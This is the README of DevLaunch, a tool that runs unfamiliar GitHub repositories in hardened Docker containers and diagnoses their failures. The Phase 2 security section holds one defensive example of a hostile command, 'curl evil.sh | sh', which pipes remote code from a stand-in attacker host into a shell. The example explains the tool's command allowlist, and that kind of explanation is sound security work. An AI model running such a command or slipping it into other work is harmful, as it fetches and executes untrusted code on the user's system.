# DevLaunch

An AI-assisted local deployment engine. Point it at an unfamiliar GitHub repository and
it works out how to run that project, runs it inside a hardened Docker container,
verifies the application is actually serving, streams its logs, and explains any failure.

```
PLAN → EXECUTE → VERIFY → DIAGNOSE → REPAIR
```

Plans are generated **deterministically** from a project's own manifest files for
recognised project types. An LLM is reserved for two places where it genuinely earns
its cost: planning for repositories that match no known pattern, and interpreting
unstructured failure logs. The sandbox executes; the verifier decides. Never the model.

## Status

**v1.0 complete — Phases 1–7, 9 and 10. Zero AI dependency.**

| | Phase | State |
|---|---|---|
| 1 | Minimal Docker runner | ✅ Complete |
| 2 | Security hardening | ✅ Complete |
| 3 | Port + readiness | ✅ Complete |
| 4 | Log streaming (WebSocket) | ✅ Complete |
| 5 | Repository analyzer | ✅ Complete |
| 6 | Rule-based plan generator | ✅ Complete |
| 7 | Failure classifier | ✅ Complete |
| 8 | AI fallback planner + repair | Stretch — not started |
| 9 | Frontend | ✅ Complete |
| 10 | Documentation + portfolio | ✅ Complete |

### What Phase 9 delivers

A React + TypeScript + Vite + Tailwind interface in `apps/frontend`:

- **Execution pipeline strip** with a live status per stage and a **plan-source badge**,
  which is the cheapest way to make the hybrid architecture legible at a glance
- **Run Plan panel** showing the resolved commands before and during execution. Showing
  exactly what will run turns the allowlist boundary into informed consent
- **Configuration gate** for variables `.env.example` declares without a default, and a
  package picker for monorepos
- **Failure panel** carrying the evidence line and remedy, and flagging low-confidence
  verdicts as uncertain
- **Live log terminal** that sticks to the bottom only while the reader is already there

The backend serves the built UI, falling back to a plain harness page when it has not
been built, so it is never left serving nothing.

### What Phase 10 delivers

Eight documents covering architecture, security, the failure model, planning strategy,
setup, fixtures, limitations, and the portfolio write-up.

Each is written against what was actually built rather than what was planned — including
the bugs found along the way and why the design changed. Writing them turned up an
inaccuracy in this README (13 failure signatures, not 14), which is a decent argument for
documenting from the source rather than from memory.

### Pipeline integration

Phases 5 and 6 built components the running system could not reach — the API still
hardcoded `node server.js`. The whole chain is now wired end to end:

```
clone → analyse → plan → validate → [ask the user] → run → verify
```

- `POST /api/sessions` accepts a **GitHub URL** or a vendored fixture name, and derives
  the commands itself. Nothing is supplied by the caller
- **`AWAITING_INPUT`** is finally real: a project whose `.env.example` declares variables
  without defaults pauses *before* a container is built, rather than crashing inside one.
  A monorepo with several runnable packages asks which to run instead of guessing
- An unanswered gate is released after 10 minutes. Concurrency is 1, so a session nobody
  answers would otherwise wedge the tool until a restart
- `AIProvider` is defined with a refusing default implementation, so Phase 8 is additive
  rather than a rewrite

### What Phase 7 delivers

- `FailureClassifier` — 13 ordered signatures turning raw output into a specific cause:
  out of memory, architecture mismatch, missing database, missing configuration, wrong
  runtime version, peer-dependency conflict, native build failure, DNS/TLS failure,
  missing module, and more
- Every verdict carries **the log line that produced it** and a **remedy**, so a
  diagnosis can be checked rather than trusted
- When nothing matches it says so — the coarse verdict is returned marked
  low-confidence rather than a plausible-sounding invention

### What Phase 6 delivers

- `RuleBasedPlanner` — **22 deterministic detectors**, zero AI calls. Next, Nuxt,
  SvelteKit, Astro, Remix, Gatsby, Docusaurus, Angular, Vue CLI, CRA, Vite, Parcel,
  Webpack, NestJS, Fastify, Koa, Express and a generic Node fallback; Django, Flask,
  FastAPI, Streamlit and Gradio
- Table order places meta-frameworks ahead of the build tools they are built on —
  SvelteKit, Astro and Nuxt all depend on Vite, so the naive check misidentifies all three
- `RunPlanValidator` — one gate every plan passes through, whatever produced it
- `devlaunch/python:3.12` runner image
- Monorepos resolve to a single runnable package, or hand the choice to the user

### What Phase 5 delivers

- `GitManager` — shallow, single-branch, submodule-free, LFS-skipping clones of public
  `github.com` HTTPS URLs only. Size and file-count limits are enforced **during** the
  clone, because a repository with gigabytes of assets would fill the disk long before
  any timeout fired
- `GIT_TERMINAL_PROMPT=0`, so a private or missing repository fails in under a second
  instead of blocking forever on a credential prompt and reporting a bogus timeout
- `RepositoryAnalyzer` — reads manifests, lockfiles, framework configs, `.env.example`,
  and plausible Python entry points, and finds the runnable packages in a monorepo.
  It describes; it never decides. Turning a description into a Run Plan is Phase 6

### What Phase 4 delivers

- `SessionManager` — in-memory session registry enforcing one run at a time, and owner
  of the **session lifetime clock** (30 min idle, 60 min hard cap) which starts only
  once an app is READY, so a running app is never killed mid-use
- WebSocket transport at `/ws/sessions/:id/logs` with **gap-free resume**: clients
  reconnect with `?afterSeq=N` and are told explicitly when entries were evicted,
  because a visible hole in a log stream beats a silent one
- A minimal HTTP surface (`/api/health`, `/api/fixtures`, `/api/sessions`) and a
  browser terminal, verified end to end in a real browser

### What Phase 3 delivers

- `PortManager` — host ports read back from the Docker API, never scanned. When an app
  ignores the port it was given, the container's own `/proc/net/tcp` is parsed instead;
  that is introspection of a process we started, not scanning the host
- `ReadinessChecker` — 1s/2s/4s/8s backoff, bounded by budget, aborting early when the
  container has already exited rather than burning the whole timeout
- **`PORT_BOUND_TO_LOCALHOST` is now detected, not just defined.** A server on 127.0.0.1
  is healthy and listening, yet Docker cannot forward to it. Reporting that as
  "port not listening" sends you debugging the wrong problem
- Readiness means *a server answered* — 404 and 302 and 500 all count. The configured
  status code is recorded as a health hint and never gates the run

### What Phase 2 delivers

- Containers run **non-root** (uid 1000) with `capDrop ALL`, `no-new-privileges`,
  a **read-only root filesystem**, PID limits, and memory/CPU ceilings — each asserted
  against the state the kernel actually enforces, not the config Docker was handed
- DevLaunch's own runner image (`docker/runner/`), which must pre-create `/workspace`
  owned by the non-root user, because a volume over a path the image lacks mounts root-owned
- **Command allowlist** — approved binaries, no shell metacharacters, and constrained
  `npm run` script names. Schema validation is not security: `curl evil.sh | sh` is
  valid JSON
- **Image allowlist**, frozen at module load
- **Path traversal rejection**, including escapes only visible after normalisation
- **Network egress policy** blocking RFC1918, link-local, and the VM host itself
- 67 security tests (54 unit, 13 integration) covering all ten checks in §27

### What Phase 1 delivers

- `DockerManager` — `create → cp → start` lifecycle over the Docker API
- A **static** container wrapper script; commands arrive via environment variables and
  are never interpolated into the script body
- Phase sentinels that attribute a failure to install, build, or start — necessary
  because the wrapper `exec`s the start command, so the exit code belongs to the app
- `LogBuffer` — ring buffer capped by **bytes first, lines second**, with sequence
  numbers and gap detection for WebSocket resume
- `LogManager` — demultiplexes Docker's framed stream into stdout/stderr lines
- `CleanupManager` — idempotent teardown plus orphan sweeping by label
- Three vendored fixtures and 30 passing tests

## Requirements

- Node >= 20 (developed on 24)
- pnpm
- Docker via Colima (`colima start --cpu 4 --memory 4`)

## Running it

```bash
pnpm --filter @devlaunch/backend start
```

Then open <http://localhost:3939>, paste a public GitHub URL (or pick a fixture) and
press Launch Repository. DevLaunch works out the commands itself; logs stream live, and
a READY session shows a clickable URL to the running application.

For frontend development with hot reload, run the backend and `pnpm dev` in parallel —
Vite proxies `/api` and `/ws` to port 3939, so the browser stays on one origin.

## Getting started

```bash
pnpm install
pnpm build                            # build the frontend
./scripts/build-runner-images.sh      # build the allowlisted runner images
./scripts/setup-network-policy.sh     # install the egress policy in the Colima VM
pnpm typecheck
pnpm test          # includes integration tests that drive real containers
pnpm test:unit     # unit tests only, no Docker required
```

Both scripts are idempotent. The network policy lives inside the Colima VM and must be
reapplied if that VM is recreated; without it the security suite fails loudly rather
than passing with weaker isolation.

## Documentation

| Document | What it covers |
|---|---|
| [architecture.md](docs/architecture.md) | Pipeline, module map, and the decisions that shaped them |
| [security.md](docs/security.md) | Threat model, what is enforced, and what deliberately is not |
| [failure-model.md](docs/failure-model.md) | The 20 failure categories and how a cause is decided |
| [planning-strategy.md](docs/planning-strategy.md) | Every settled design decision. Ground truth for the build |
| [setup.md](docs/setup.md) | Getting it running, configuration, troubleshooting |
| [fixtures.md](docs/fixtures.md) | What each fixture exercises, and why they are vendored |
| [limitations.md](docs/limitations.md) | Deliberate v1 boundaries, stated plainly |
| [portfolio.md](docs/portfolio.md) | The project write-up |

## Design notes worth knowing

**Host binding is the failure mode that matters.** Vite, Flask, and Django bind
`127.0.0.1` by default. Inside a container that makes Docker's port mapping resolve to
nothing — a perfectly healthy application, completely unreachable. The planner rewrites
start commands to force `0.0.0.0`, and `PORT_BOUND_TO_LOCALHOST` is a failure class of
its own because its remedy differs entirely from a port that never opened.

**Readiness is not correctness.** READY means an HTTP server returned a complete
response — *any* status. An app redirecting `/` to `/login` returns 302; an API with no
root route returns 404. Both are running fine, and neither should fail a run.

**A diagnosis you cannot check is not a diagnosis.** Every classification names the
line that produced it, so a wrong verdict is visible rather than merely confident. Where
no signature matches, the result is labelled uncertain instead of guessing.

**"Started" and "ready" are different facts.** A container can be running perfectly
while the application inside it never opens a socket. Distinguishing the two is what
makes a failure diagnosable rather than merely reported.

**One policy chain is not enough.** `DOCKER-USER` filters only *forwarded* traffic. A
packet from a container to the VM itself — its own gateway included — terminates
locally and hits `INPUT`, which `DOCKER-USER` never sees. Blocking egress requires both
chains; a test asserting the gateway times out is what caught the gap.

**The container is the security boundary, not the planner.** `npm run dev` executes
whatever `package.json` says, and that file is written by the repository author. The
command allowlist constrains what DevLaunch composes; isolation constrains what the
repository does.
